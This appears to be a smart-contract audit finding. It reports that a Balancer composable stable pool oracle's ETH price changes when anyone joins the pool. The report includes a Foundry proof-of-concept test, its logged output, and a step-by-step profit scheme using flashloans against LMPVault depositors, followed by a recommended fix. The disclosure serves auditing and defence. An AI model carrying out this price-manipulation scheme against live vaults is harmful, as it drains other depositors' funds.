# `BalancerLPComposableStableEthOracle::getPriceInEth` can be updated by joining the pool
## Summary

`BalancerLPComposableStableEthOracle::getPriceInEth` will return different price upon joining the pool.
An attacker can abuse the price difference to gain profit off other users.


## Vulnerability Detail

The proof of concept in the following gist demonstrates how the `BalancerLPComposableStableEthOracle::getPriceInEth` can be updated by joining the pool:
https://gist.github.com/lemonmon1984/ae73bfa007b5421d6d6efdbb0f2d9202

The proof of concept is diff from the existing test `test/oralces/providers/BalancerLPComposableEthOracle.t.sol`.
The test function is copied below:

```solidity
    function testWstETHsFRXEthrETHPool_poc() public {
        mockRootPrice(WSTETH, 1_124_023_737_293_252_681); //wstETH
        mockRootPrice(RETH, 1_071_929_592_001_012_800); //rETH
        mockRootPrice(SFRXETH, 1_039_355_991_640_087_568); //sfrxETH

        uint256 price = oracle.getPriceInEth(WSTETH_RETH_SFRXETH_POOL);
        emit log_named_uint("price", price);

        // joinPool
        address wstethWhale = 0x5fEC2f34D80ED82370F733043B6A536d7e9D7f8d;   
        IBalancerPool pool = IBalancerPool(WSTETH_RETH_SFRXETH_POOL);
        bytes32 poolId = pool.getPoolId();
        (IERC20[] memory poolTokens,,) = VAULT.getPoolTokens(poolId);
        uint256[] memory amountIn = new uint256[](4);
        amountIn[1] = 100000; // WSTETH in


        uint256[] memory amountsUser = new uint256[](3);
        amountsUser[0] = amountIn[1];
        amountsUser[1] = amountIn[2];
        amountsUser[2] = amountIn[3];
        IBalancerVault.JoinPoolRequest memory joinRequest = IBalancerVault.JoinPoolRequest({
          assets: _convertERC20sToAddresses(poolTokens),
          maxAmountsIn: amountIn,
          userData: abi.encode(
            IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,
            amountsUser,
            0
          ),
          fromInternalBalance: false
        });

        vm.startPrank(wstethWhale);
        IERC20(WSTETH_MAINNET).approve(address(VAULT), type(uint256).max);
        VAULT.joinPool(poolId, wstethWhale, wstethWhale, joinRequest);
        vm.stopPrank();


        price = oracle.getPriceInEth(WSTETH_RETH_SFRXETH_POOL);
        emit log_named_uint("price", price);
    }
    function _convertERC20sToAddresses(IERC20[] memory tokens) internal pure returns (address[] memory assets) {
        //slither-disable-start assembly
        //solhint-disable-next-line no-inline-assembly
        assembly {
            assets := tokens
        }
        //slither-disable-end assembly
    }
```

In the example, the price is printed twice, before joining the pool and after joining the pool.
As the log shows:

```solidity
Logs:
  price: 1006782204451297204
  price: 1006790817198331710
```

The price will reflect the price movement of the asset in question.
So the caller does not seem to control the direction of the price movement, as well as the price different.
If the asset's price is moving more the price discrepancy before and after the joining will be bigger.
Also, the `amountIn` to the pool can be small as the snippet of the proof of concept shows: 100000 wei of WSTETH.

An attacker can use this price change to gain profit in the same manner in the issue 10 - "`LMPVault`'s cached `totalDebt` can be abused to drain `LMPVault`".
In the issue 10, the attacker waits for the price movement and call (deposit -> updateDebtReporting -> withdraw) to gain profit.

With the current issue, the attacker would follow these steps to profit:
1. join the pool to see the price movement
1. if the price movement is up, deposit into LMPVault
1. updateDebtReporting to make the totalDebt higher
1. withdraw
- condition: there is a DestinationVault using BalancerLPComposableStablePool, and some asset is deployed to the vault

The attacker can use flashloan to maximize the gain as all the steps should be done in the same transaction.

Although the attacker can choose the direction of the price movement, they can deploy a smart contract to selectively react on their favorable price movement.

Also, even if the issue 10 is fixed, the attacker can still exploit this issue by using a smart contract. The contract would deposit on the LMPVault first then join the pool to see the price has gone up or down. If the price should go up, whole LMPVault share will be withdrawn, solidifying the profit, otherwise just revert.

The price movement may be smaller than the issue 11 - "`BalancerLPComposableStableEthOracle::getPriceInEth` can be updated by joining the pool" of the LP token price manipulation, but the attacker's investment is also small (compare to the swap fee in the issue 11).


The price from the `BalancerLPComposableStableEthOracle::getPriceInEth` changes upon joining the pool, due to the update of the `pool.getRate` value.

```solidity
72         price = (minPrice * pool.getRate()) / 1e18; 
```

## Impact

An attacker can profit from the update of the price, causing the LMPVault and other depositors take the loss.

## Tool used

Manual Review

## Recommendation

update the `IBalancerComposableStablePool`'s getRate value before using it for the price
